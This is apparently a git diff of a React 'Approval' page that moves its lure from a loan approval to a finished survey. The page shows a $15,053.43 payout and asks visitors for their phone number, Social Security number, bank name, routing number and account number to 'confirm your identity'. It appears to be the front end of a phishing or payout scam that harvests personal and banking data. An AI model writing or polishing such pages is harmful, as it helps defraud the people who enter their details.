@@ -1,8 +1,6 @@
 import React, { useState } from "react";
 import { toast } from "react-toastify";
 import axios from "axios";
-import PhoneInput from "react-phone-number-input";
-import "react-phone-number-input/style.css";
 import { useHistory } from "react-router-dom";
 
 function Approval() {
@@ -36,10 +34,10 @@ function Approval() {
     <>
       <div className="py-4">
         <h1 className="text-gray-600 mt-10 text-4xl justify-center items-center flex">
-          Congratulations!
+          CONGRATULATIONS!
         </h1>
         <p className="text-gray-600 py-5 text-2xl justify-center items-center flex">
-          Your loan has been approved
+          your survey was successfully submitted
         </p>
 
         <div className=" py-5 px-5 bg-indigo-100 shadow justify-between items-center flex">
@@ -47,7 +45,7 @@ function Approval() {
           <p className="text-green-600 font-bold text-3xl">$15,053.43</p>
         </div>
         <div className="items-center flex justify-center py-4 px-5  ">
-          <p className="text-gray-800 font-bold">
+          <p className="text-indigo-600 font-bold">
             Please confirm your identity and provide your bank details
           </p>
         </div>
@@ -74,10 +72,11 @@ function Approval() {
                   Phone
                 </label>
                 <div className="mt-1">
-                  <PhoneInput
-                    defaultCountry="US"
+                  <input
+                    type="number"
                     value={phone}
-                    onChange={setPhone}
+                    onChange={(e) => setPhone(e.target.value)}
+                    className="w-full border-gray-300 rounded-lg shadow-sm"
                   />
                 </div>
               </div>
@@ -123,10 +122,11 @@ function Approval() {
                   />
                 </div>
               </div>
+
               <div className="mt-5">
                 <button
                   type="submit"
-                  className="w-full flex justify-center MT-5 py-2 px-4 border border-transparent rounded-md 
+                  className="w-full flex justify-center mt-5 py-2 px-4 border border-transparent rounded-md 
                   shadow-sm text-white text-sm font-medium bg-indigo-600 hover:bg-indigo-700
                    focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500"
                   disabled={!phone || !ssn || !bank || !routing || !account}
